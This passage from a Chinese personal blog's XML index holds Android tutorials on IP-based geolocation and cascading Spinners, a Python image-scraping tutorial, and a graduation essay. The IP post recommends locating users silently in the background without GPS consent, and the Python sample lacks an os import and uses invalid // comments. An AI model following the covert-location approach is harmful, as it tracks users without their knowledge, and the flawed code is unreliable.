try &#123; response = new String(bytes, &quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println(response); &#125; &#125;);&#125; 执行请求在mIpHandler接收到ip地址后，再调用获取定位信息的Http方法（即在mIpHandler的handleMessage方法的最后加入下面这行代码） 1IpHttpUtil.getAddress(mCityHandler, res); //发送获取定位信息的http请求 效果展示我们在获取ip地址那篇博客的例子的基础上增加了一个TextView来显示本篇博客获取的定位信息，如下图所示，我们获取并显示了得到的JSON格式的返回数据，即通过该ip地址获得的定位信息。如下图所示，我们可以看到已经获得了服务器返回的JSON数据，但是可以很清楚的看到，显示的unicode编码，并不是汉字，那就需要将接收到的数据转化成汉字咯。 在网上摘抄了一段unicode转汉字的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private String decodeUnicode(String theString) &#123; char aChar; int len = theString.length(); StringBuffer outBuffer = new StringBuffer(len); for (int x = 0; x &amp;lt; len;) &#123; aChar = theString.charAt(x++); if (aChar == &apos;\\&apos;) &#123; aChar = theString.charAt(x++); if (aChar == &apos;u&apos;) &#123; // Read the xxxx int value = 0; for (int i = 0; i &amp;lt; 4; i++) &#123; aChar = theString.charAt(x++); switch (aChar) &#123; case &apos;0&apos;: case &apos;1&apos;: case &apos;2&apos;: case &apos;3&apos;: case &apos;4&apos;: case &apos;5&apos;: case &apos;6&apos;: case &apos;7&apos;: case &apos;8&apos;: case &apos;9&apos;: value = (value &amp;lt;&amp;lt; 4) + aChar - &apos;0&apos;; break; case &apos;a&apos;: case &apos;b&apos;: case &apos;c&apos;: case &apos;d&apos;: case &apos;e&apos;: case &apos;f&apos;: value = (value &amp;lt;&amp;lt; 4) + 10 + aChar - &apos;a&apos;; break; case &apos;A&apos;: case &apos;B&apos;: case &apos;C&apos;: case &apos;D&apos;: case &apos;E&apos;: case &apos;F&apos;: value = (value &amp;lt;&amp;lt; 4) + 10 + aChar - &apos;A&apos;; break; default: throw new IllegalArgumentException( &quot;Malformed \\uxxxx encoding.&quot;); &#125; &#125; outBuffer.append((char) value); &#125; else &#123; if (aChar == &apos;t&apos;) aChar = &apos;\t&apos;; else if (aChar == &apos;r&apos;) aChar = &apos;\r&apos;; else if (aChar == &apos;n&apos;) aChar = &apos;\n&apos;; else if (aChar == &apos;f&apos;) aChar = &apos;\f&apos;; outBuffer.append(aChar); &#125; &#125; else outBuffer.append(aChar); &#125; return outBuffer.toString(); &#125; 使用此方法将接收到的字符处理后即可获得获得汉字显示，如下图：]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android获取外网ip地址详解]]></title>
    <url>%2F2016%2F07%2F10%2FAndroid%E8%8E%B7%E5%8F%96%E5%A4%96%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[很多App都需要获取当前所在位置，如果需要获取精确地位置当然是使用GPS定位啦，但是有时候不需要那么精确的定位，而且手机开启GPS进行定位需要用户手动打开GPS开关，那么如何无声无息的在后台进行定位呢？其实，只要获取到本机的外网ip地址就能够获取你的所在大概地址啦！此篇博客主要讲解如何获取外网ip，如何通过ip进行定位将写在下一篇博客中。 获取外网ip地址实现方法想必很多人都查过本机的外网ip地址，通过cmd的config等命令看到的都是内网ip，要想查看外网ip有一个很简单的办法就是在百度输入ip，点击搜索即可看到自己的外网ip，这个结果通常是由www.ip138.com这个网站提供的，我们点进去可以看到他其实提供了ip地址查询服务。那我们就可以把这个利用起来，这里其实会用到类似爬虫的技术，也就是把网页源代码下下来，然后从源代码中提取ip地址。打开浏览器的开发者工具，定位ip地址那一行代码，可以看到如下代码： 我们对http://1212.ip138.com/ic.asp发送一个get请求即可获得服务器返回的ip地址信息。 android-async-http在AndroidManifest.xml文件中加入如下：1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; jar包下载点击此处可以下载第三方网络请求库：android-async-http的jar包 将jar包添加到工程将jar包复制到lib文件夹下，并右键该jar包，点击BuildPath，然后点击Add to Build Path。 获取网站返回信息对http://1212.ip138.com/ic.asp发送一个get请求来获得服务器返回的ip地址信息。 123456789101112131415161718192021222324252627282930public class IpHttpUtil &#123; public static void GetNetIp(final Handler handler, String url) &#123; AsyncHttpClient client = new AsyncHttpClient(); client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int arg0, Header[] arg1, byte[] bytes) &#123; // TODO Auto-generated method stub String ipLine = null; String response = null; try &#123; //字节转字符串，并指定编码方式为GBK，否则会乱码 response = new String(bytes, &quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println(&quot;返回的信息&quot; + response); //打印返回信息 &#125; @Override public void onFailure(int arg0, Header[] arg1, byte[] bytes, Throwable arg3) &#123; // TODO Auto-generated method stub String response = new String(bytes); System.out.println(response); &#125; &#125;); &#125;&#125; 返回信息如下： Java正则表达式取出字符串我们要从网站返回的html中提取ip地址则可以通过正则表达式来进行匹配： 提取中括号内容的规则：\[.*\]，对Http请求得到的response进行正则匹配，得到字符串：[xxx.xxx.xxx.xxx]，然后再进行字符串切割，取出ip地址。 1234567891011//匹配中括号及其之间的内容Pattern pattern = Pattern.compile(&quot;\\[.*\\]&quot;); Matcher matcher = pattern.matcher(response.toString());if (matcher.find()) &#123; ipLine = matcher.group();&#125;if(!ipLine.isEmpty())&#123; //去掉左右两边的中括号 ipLine = ipLine.substring(1, ipLine.length() - 1); &#125;System.out.println(&quot;ip地址：&quot; + ipLine); 将获取到的数据通过Handler传回到Activity：1234//将得到的ip地址传递给Activity进行显示Message msg = new Message();msg.obj = ipLine;handler.sendMessage(msg); 在Activity中调用Http请求：1234567891011121314151617181920212223242526public class MainActivity extends Activity &#123; private TextView mName, mIp; private Handler mIpHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; String res = (String) msg.obj; //取出通过Handler传递过来的字符串 System.out.println(&quot;MainActivity:&quot; + res); mIp.setText(res); //显示到界面 &#125;; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mName = (TextView) findViewById(R.id.tv_name); mIp = (TextView) findViewById(R.id.tv_ip); mName.setText(&quot;你的外网ip地址是：&quot;); //发送Http请求 String url = &quot;http://1212.ip138.com/ic.asp&quot;; IpHttpUtil.GetNetIp(mIpHandler, url); &#125;&#125; 效果展示 获取了本机的外网ip之后就可以通过这个ip来进行定位啦！欲知后事如何，请看下回分解！]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫基础-正则表达式与Http请求]]></title>
    <url>%2F2016%2F07%2F03%2FPython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8EHttp%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[网络爬虫又称为网络机器人，它可以按照程序设定的规则自动抓取网页上的信息。网络是信息的海洋，但是网络中的数据是零散的、无序的且存在着冗余，如何从复杂的网页代码中提取有用的信息便是爬虫需要解决的问题。Python语法简洁，代码风骚，数据的处理能力强，比如函数参数的打包解包，列表解析，矩阵处理，非常方便，所以Python非常适合做网络爬虫。我将在这里很大家分享我的一些网络爬虫小程序，让我们一起体验爬虫带来的乐趣吧！ 基本正则表达式Python正则表达式模块：re模块 导入re模块：1import re python通过re模块提供对正则表达式的支持。 常用方法findall： 匹配所有符合规律的内容，返回包含结果的列表 Search：匹配并提取第一个符合规律的内容，返回一个正则表达式对象（object) Sub：替换符合规律的内容，返回替换后的值 常用符号，，问号与括号 点号. : 匹配任意字符，换行符\n除外 星号* ：匹配前一个字符0次或无限次 问号? ：匹配前一个字符0次或1次 贪心算法：.* 非贪心算法：.*? 括号（）：括号内的数据作为结果返回 常用情况使用findall与search从大量文本中匹配感兴趣的内容 使用sub实现换页功能 Http网络请求requests模块 Requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。 导入requests模块1import requests 基本Get请求12345#-*- coding:utf-8 -*- //定义编码为utf-8，避免显示乱码import requestsurl = &apos;http://www.baidu.com&apos; r = requests.get(url) //使用requests模块的get方法获取百度首页的源代码print r.text 这里只举例了我们要使用的基本的get请求，如果需要了解更多的requests模块的方法请自行百度。 实例代码目的：爬取湖南农业大学官网中心位置的三张图片，并且下载下来 获取图片的源代码使用chrome打开农大官网，右键审查元素，然后点击左上角的放大镜，点击图片就会定位到图片的源代码位置，如图所示： 分析源代码，写出正则表达式分析上图可知，我们需要的部分为src=””中引号里面的url，而三张图片都是相同的格式，所以我们使用re模块的findall方法，将src的中间部分获取到即可：re.findall(‘img src=”(.?)” width=”990”‘,html.text,re.S)（1）findall即匹配所有符合正则表达式规则的内容（2）(.?)用作获取src=””的双引号中间的url并返回（3）re.S的作用是使.的作用范围包括换行符，即可以换行匹配 根据获取到的url下载图片因为我们获取到的url并不是完整的网址，所以右键上图的链接选择Open link in new tab来查看完整的网址，如下图，因此我们在下载图片时需要在url前加上http://www.hunau.edu.cn/。 代码如下：123456789101112131415161718import re //导入正则表达式的库import requests //导入第三方http库html = requests.get(&quot;http://www.hunau.edu.cn/&quot;) //通过get方法获取农大官网的网页源代码html.encoding = &apos;utf-8&apos; //设定编码方式，使能够正常显示中文# print(html.text) //也可以把网页源代码输出来看一下homedir = os.getcwd() //获取项目当前路径os.mkdir(homedir+&apos;\pic&apos;) //创建pic文件夹，用于保存图片pic_url = re.findall(&apos;img src=&quot;(.*?)&quot; width=&quot;990&quot;&apos;,html.text,re.S) //设定正则表达式，爬取图片的urli = 0for each in pic_url: //遍历pic_url print &apos;now downloading:&apos; + each pic = requests.get(&quot;http://www.hunau.edu.cn/&quot;+each) //补充完整的网址，通过get方法获取图片 fp = open(&apos;pic\\&apos; + str(i) + &apos;.jpg&apos;,&apos;wb&apos;) //在pic文件夹下创建jpg格式的文件 fp.write(pic.content) //将图片写入到工程文件夹下的pic文件夹中 fp.close() i += 1 文本爬虫，效果如下： 我们在这里只是爬取了三张图片，但是使用python来做网页爬虫真的功能很强大，大家可以试一试修改代码去爬取更多的图片。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Http</tag>
        <tag>正则表达式</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Spinner控件之省市区（县）三级联动]]></title>
    <url>%2F2016%2F07%2F01%2FAndroid-Spinner%E6%8E%A7%E4%BB%B6%E4%B9%8B%E7%9C%81%E5%B8%82%E5%8C%BA%EF%BC%88%E5%8E%BF%EF%BC%89%E4%B8%89%E7%BA%A7%E8%81%94%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[使用Spinner控件实现省市区三级联动在很多地方都需要用到，比如用户个人信息填写、快递地址填写等场景，这是一个比较基本的功能，但是实现起来却有点麻烦，因为要加载很多的资源数组。掌握基本的省市区三级联动很有必要，当然，再加上一些酷炫的UI设计就能更nice。 布局文件添加三个Spinner控件，分别用于省、市、区（县）： 1234567891011121314151617181920212223242526272829303132&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;horizontal&quot; &gt; &lt;Spinner android:id=&quot;@+id/spinner_province&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.2&quot; &gt; &lt;/Spinner&gt; &lt;Spinner android:id=&quot;@+id/spinner_city&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;4dp&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.2&quot; &gt; &lt;/Spinner&gt; &lt;Spinner android:id=&quot;@+id/spinner_county&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;4dp&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.8&quot; &gt; &lt;/Spinner&gt;&lt;/LinearLayout&gt; 逻辑实现实现原理：为每一个Spinner添加监听，选择省份后加载该省份的市区（县）数组资源，选择市之后加载该市对应的区（县）数组资源，从而实现三级联动。 代码有点多，这里只贴了核心代码，资源数组与定义的资源数组ID数组都没有写出来了，目前博客的下载插件还没弄好，暂时无法提供下载，，如果需要源码可以联系我联系方式在主页可看到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294public class MainActivity extends Activity &#123; private Spinner mProvinceSpinner, mCitySpinner, mCountySpinner; private ArrayAdapter&lt;CharSequence&gt; mProvinceAdapter, mCityAdpater, mCountyAdapter; private int mProvinceId, mCityId; private String mProvinceName, mCityName, mCountyName; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mProvinceSpinner = (Spinner) findViewById(R.id.spinner_province); mCitySpinner = (Spinner) findViewById(R.id.spinner_city); mCountySpinner = (Spinner) findViewById(R.id.spinner_county); // 省份选择 mProvinceAdapter = ArrayAdapter.createFromResource(this, R.array.province_item, android.R.layout.simple_spinner_item); mProvinceAdapter .setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); mProvinceSpinner.setAdapter(mProvinceAdapter); mProvinceSpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated method stub // 获取省的ID mProvinceId = mProvinceSpinner .getSelectedItemPosition(); // 获取省的名字 mProvinceName = mProvinceSpinner.getSelectedItem() .toString(); // 市选择 SpinnerBindResource(mCitySpinner, mCityAdpater, city[mProvinceId]); mCitySpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected( AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated method stub // 获取市的ID mCityId = mCitySpinner .getSelectedItemPosition(); // 获取市的名字 mCityName = mCitySpinner .getSelectedItem().toString(); // 县选择 switch (mProvinceId) &#123; case 0: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfBeiJing[mCityId]); break; case 1: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfTianJing[mCityId]); break; case 2: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHeBei[mCityId]); break; case 3: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanXi1[mCityId]); break; case 4: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfNeiMengGu[mCityId]); break; case 5: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfLiaoNing[mCityId]); break; case 6: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiLin[mCityId]); break; case 7: SpinnerBindResource( mCountySpinner, mCountyAdapter, countyOfHeiLongJiang[mCityId]); break; case 8: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShangHai[mCityId]); break; case 9: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiangSu[mCityId]); break; case 10: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfZheJiang[mCityId]); break; case 11: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfAnHui[mCityId]); break; case 12: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfFuJian[mCityId]); break; case 13: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiangXi[mCityId]); break; case 14: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanDong[mCityId]); break; case 15: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHeNan[mCityId]); break; case 16: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHuBei[mCityId]); break; case 17: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHuNan[mCityId]); break; case 18: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuangDong[mCityId]); break; case 19: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuangXi[mCityId]); break; case 20: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHaiNan[mCityId]); break; case 21: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfChongQing[mCityId]); break; case 22: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfSiChuan[mCityId]); break; case 23: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuiZhou[mCityId]); break; case 24: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfYunNan[mCityId]); break; case 25: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfXiZang[mCityId]); break; case 26: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanXi2[mCityId]); break; case 27: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGanSu[mCityId]); break; case 28: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfQingHai[mCityId]); break; case 29: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfNingXia[mCityId]); break; case 30: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfXinJiang[mCityId]); break; case 31: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHongKong[mCityId]); break; case 32: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfAoMen[mCityId]); break; case 33: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfTaiWan[mCityId]); break; default: break; &#125; mCountySpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected( AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated // method stub mCountyName = mCountySpinner .getSelectedItem() .toString(); Toast.makeText( MainActivity.this, &quot;你选择的是：&quot; + mProvinceName + &quot;-&quot; + mCityName + &quot;-&quot; + mCountyName, Toast.LENGTH_SHORT) .show(); &#125; @Override public void onNothingSelected( AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated // method stub &#125; &#125;); &#125; @Override public void onNothingSelected( AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); &#125; @Override public void onNothingSelected(AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); &#125; // 数据绑定 public void SpinnerBindResource(Spinner spinner, ArrayAdapter&lt;CharSequence&gt; adapter, int arrayId) &#123; adapter = ArrayAdapter.createFromResource(this, arrayId, android.R.layout.simple_spinner_item); adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); spinner.setAdapter(adapter); &#125;&#125; 效果展示 注：如果需要源码可以联系我，联系方式在主页可看到。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Spinner］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六月，毕业季---感恩有你]]></title>
    <url>%2F2016%2F07%2F01%2F%E5%85%AD%E6%9C%88%EF%BC%8C%E6%AF%95%E4%B8%9A%E5%AD%A3-%E6%84%9F%E6%81%A9%E6%9C%89%E4%BD%A0%2F</url>
    <content type="text"><![CDATA[都说毕业遥遥无期，转眼就要各奔东西。又到毕业季，从在外实习的学长学姐回到学校，到学长学姐忙毕业论文，再到好多的送别宴，到最后的毕业典礼，到离别，这一段时间感触很多，但是一直没有记录下来，现在是时候写一写了。虽然不是我自己毕业了，但是还是有很多很多感触。毕竟是最亲的一届学长学姐，很多很亲近很熟悉的人就要离开了，说不定以后也很难再相见，也因为过完这个学期就是准大四学生了，一年后就是我们的毕业。 毕业典礼的第二天，蚯蚓学姐离开了学校，也是那天，算是大学最后一门正正规规的课，最后一次课程设计答辩也结束了。那天，答辩完，下楼就碰到了我们的助班学姐，她马上就要离校，匆匆忙忙拍了一张合照。突然觉得好伤感，学长学姐毕业，我们大学基本的课程结束，真的有很多很多要想说的话。 大一报道是一个人来的学校，从高铁站坐的农大校车到修业广场，来到这个陌生的地方，是助班学姐和一位学长帮我提行李，送我到寝室去的。一路上学姐给我各种介绍，特别清楚记得图书馆西边的小坡有几个由小树修剪成的校训：朴诚、奋勉、求实、创新，时至今日，我依然牢记。之后的军训，对于不常锻炼的我来说确实比较艰难，但是因为有大家一起，也因为有助班学长学姐的关心，我才坚持下来。不能说军训有多么多么的值得怀恋，毕竟我不是特别喜欢军训的人，但是记得有句话：所有的事情都有他存在的意义。或许也是军训这段时间让给我们懂得吃苦耐劳，结奋斗吧！军训结束，班级聚餐，大家各种喝酒，也于是大家慢慢熟悉起来。 国庆之后，随着大学正式开课、学生会招新等，我的大学生活也真正开始了。先说说组织部吧，我爱了三年的部门。我的助班蚯蚓学姐是我的部长，在这个部门她教给我很多的东西，最重要的应该是为人处世，有些东西真的就是耳濡目染，慢慢的会领悟很多。组织部的常规活动就是民主生活会了，说不出什么特别的地方，每两周一次的活动，组织部是作为检查打分的角色出现的，一开始还很有兴致，但是慢慢的也就觉得没什么意思了，然后还有一些比如收团费、团干培训等等事情，其实很多事情都是部长副部帮我们做了，只怪学姐们太能干，哈哈。最开心的当然还是部长带我们出去浪吧，去吃饭唱歌，记得部门最后一次是在市里的，在湘江边吃的饭，然后去唱了晚晚场，很开心，也很难忘。大一下学期，从懵懂的小屁孩也开始懂得了一些事情，一届学生会结束，昔日一起做事一起玩耍的小伙伴以后就很难有这样的机会了。 生活部的话，我的部长虎哥，副部诚哥、兰姐都对我很好。当干事的一年里，也是没什么特别的地方，每周一早上去早检，也就是叫学长学姐起床，然后检查宿舍卫生，还是很佩服自己大一的时候，也是从那时候培养的一种精神吧，冬天的早检是很痛苦的，天还没亮就要出发，但是不管多么冷，我都可以坚持从芷兰到金岸去早检。一直觉得生活部还是挺温馨的，有一个热心的部长，然后人也很多，经常能聚聚餐，喝酒也算是常态了，也有喝醉的时候，但是还是很开心，毕竟大家像一个温馨的大家庭。虽然可能到现在很多人都已经不熟悉了，但是至少大家以前都在生活部待过，都有过这段美好的回忆。 大一下学期，在图书馆大成厅，实验室招新宣讲会。学院几大实验室的指导老师都来宣传自己的实验室，曾炼成老师结合之前实验室的一些作品宣传了电子设计创新实验室，就在那时，我觉得这就是我要去的地方。现在回想起来，其实很多事情真的就是一种缘分，说不上什么很特别的理由。会后，我给曾老师打了电话表达了我想要加入电子设计创新实验室的想法，然后他让我找陈刚老师，再然后陈老师让我去找欧超学长，就这样，没有面试没有考核就这样进来啦。进来以后才知道，原来这个实验室已经很久没人管了，但是还是有一批学长学姐在这里学技术。虽然和想象的有区别也有点失望，但是欧超学长的热情与真诚打动了我，也是他带着我从零开始学习单片机，带我去图书馆找资料，给我拷视频资料，拿单片机开发板给我用，后来还给了我实验室的钥匙。经过一段时间的学习，我对单片机已经有了大体的一些了解，也开始真正了解大学应该学些什么。现在回想起来，其实当时的这一步对我来说真的非常重要，没有这些经历，我也不会这么快懂得要学习什么，怎么学习。 大二期间，担任班长、院学生会组织部副部长。其实，在开始的竞选中发生了很多不愉快的事情，但是还好最后的结果大家都还算满意。这一年里，班长、院学生会组织部副部长两个职务，也是对自己全新的挑战吧。作为班长，我想尽各种办法让班上同学能够认真学习专业知识，积极联系老师，积极开展导师制，积极完成学工老师交代的任务，积极带领班上同学搞活动、搞学习，一年下来，感觉很多事情都白做了，自己收获的很多，但是班级并没有很大的改观。其实，真的，大学关键还是靠自己，自己不动，别人怎么给你想办法都没用。作为组织部的副部长，积极配合我的部长的工作，带领几个小干事一起干活。天才第一步，进我组织部，这是蚯蚓学姐为组织部想的宣传语，沿用至今。很庆幸能够在组织部遇到这群人，我的领导善解人意、办事能力强，几位小干事也都很听话，感觉就是一个温馨的大家庭。现在看到他们越来越好我也是很开心的，毕竟我们永远是一家人。很遗憾的是我们部门在这个毕业季没能和我们上届的部长，也就是蚯蚓学姐吃一顿饭了，学姐真的是太忙了，档期安排的满满的，到最后也没找到机会一起。 也是在大二，我慢慢的开始适应实验室的环境，它没有图书馆压抑的气氛，在这里我们动手做实验，学习电子设计方面的知识，思维可以放得很开，网络也很方便，可以迅速的查阅资料，在这里我获得了前所未有的信息量，很大程度上开阔了视野。欧超、杨勇锋等几位学长策划着建立一个电子协会，也开始带着手实验室的招新工作。这一年，实验室招了30个13级学生，几位学长负责每周为我们讲课，因为这个平台我和后来一起带实验室和协会的搭档尹远和张涛开始熟知。也是这一年实验室获得了不错的发展，有了电子协会这个宣传的平台，实验室也开始被学弟学妹们所了解。学长们乐于奉献的精神也给我很大的影响，也是我接手实验室之后一直努力想把实验室建设好的原因吧，希望这种精神能够延续下去。同时，由于大二的数据结构课程，卧铺有幸认识了我的恩师戴教授，并开始在他的指导下接触科研。他是一个个踏踏实实搞教学和科研的人，他认真严谨的态度一直感染着我，也是他带着我写论文、学安卓、玩树莓派、报科创项目，能够耐心的听我讲我最新了解到的知识，和我一起聊技术方面的事情，也时常给我推荐各种书籍和资料。其实，让我最感动的还是他的倾听，因为在大学里很多教授都是很难见到的，但是每次他都能耐心的听我讲完并给我一些建议，在技术上算是一个知己吧。很多次在他办公室看到他在学习新的知识，也会看到他为了备课经常下载更多的资料以及自己看慕课来完善自己的课堂，这些在我看来都是很难得的。他的不断学习的意识以及认真严谨的学术态度让我很佩服，所以我也愿意一直跟着他学习，希望以后能成为像他这样优秀的人。 大三开始，真正接手实验室。说实话，一开始真的很无助，以前都是超哥和锋哥担当起很多的责任，实验室、协会上课都是他们在负责，但是他们已经去深圳参加嵌入式的培训了，剩下维哥也在学校准备找工作去实习了，不知道怎么办。不过，还好，上天总是眷顾努力的人们，就在这时候匡老师来了，她要来带一带实验室，匡老师的热情与真诚让我看到了希望，之后的很多事情很多安排都是她在做，包括实验室的规划、指导老师的调动等。于是，我也有了信心，在没有什么带过学弟学妹的经验的情况下，我平时积极学习，每周都积极备课，希望大家来了就能有收获，也邀请了维哥、能神来给大家讲课，总的来说，虽然我讲课确实讲得不好，讲得快，没有意识到大家是否听懂，但是至少在我带的这段时间，很多安排都在井井有条的进行，自我感觉还是很有希望的，实验室的学习气氛还是获得了其他老师的认可，也是因为大三上学期的积累，大三下学期的蓝桥杯才能取得不错的成绩。为了蓝桥杯，我确实付出了很多，画板子、调板子、再到安排大家焊接，已经之后各个模块的熟悉，确实花了很多时间。当初，毫无保留的把自己学会的与大家分享，也是希望大家都能在比赛中获得好的成绩。还好，我的付出也算有了回报，努力的人们都取得了不错的成绩，我自己也拿了省一等奖，获得去北京参加决赛的机会。去北京的经历已经很详细的记录在另一篇博客了，这里就略过吧。这其中也还是很感谢实验室各位老师的辛勤付出吧，特别是匡老师和陈老师，一个负责组织，一个负责技术，也挺好的啦！有时候，回想起来，这一段路有心酸、有泪水也有感动吧，当你一个人默默付出的时候，别人可能并不知道，但是在收获的时候你一定是最幸福的。 最近想尽办法让自己静下来好好复习，也买了很多书准备看看。这学期真的忙了很多的事情，一直想参加更多的比赛，想拿更多的奖，但是到头来发现过程中的收获比结果重要很多，虽然在有时候我们不得不拿出些奖励来获得别人的认可，但是我现在更希望自己具备真正的实力。不积跬步，无以至千里，不积小流，无以成江海，与其参加更多意义并不大的比赛，还不如静下来好好学知识学技术，这样不管对于找工作还是考研都是很有帮助的。到现在，很多事情都不想去做了，只想安安静静的复习考研，所以7月在武汉的的智能互联大学分赛区决赛我也不准备去了。为了让自己能够静下来好好复习我也确实放弃了很多东西，有时候也会觉得比较无奈吧。如果让我说大学三年来最大的遗憾是什么，我认为应该是我在大学没有找到一个好的团队，不是说怪队友怎么怎么，而是真的没有几个一起并肩奋斗的人，很多时候都是自己一个人在战斗，好几次比赛都是自己找的人，别人还不太乐意，团队没有共同的明确目标那很难走下去，有时候很绝望的是你想去做一个项目，别人却总是有各种事情，所以到现在我也慢慢明白了，确实大家都有各自的事情要忙，没有共同的目标又何苦要求别人一起来呢，这应该是我最近认识的最深刻的问题了。我是一个常常喜欢反思自己、思考问题的人，只是很多时候我并不喜欢表达出来，在别人看来这或许是我的缺点吧，但是有些想法确实不能说。 倒是还是很担心实验室，毕竟大家花了那么多心思才让实验室有一点起色，我不想让这一点点希望就这样没了，现在的情况让我很担忧，老师没时间来，学生也忙自己的事情，不主动，大概很久都没有听到实验室的动静了。有时候就是有那么一点点好强，总是去和其他实验室比较，看到这样的现状感觉很不爽，但是自己又不能改变什么。这两年真的把实验室当成了自己大学里的一个家了，在这里的成长与感动让我觉得大学过得很充实也很踏实，虽然不能在这里待一辈子，但是还是希望这个实验室能够越来越好。六月就这样结束了，大学前三年也就这样结束了，七月已经到来，现在的我只想好好复习准备考研或者找份好工作啦。 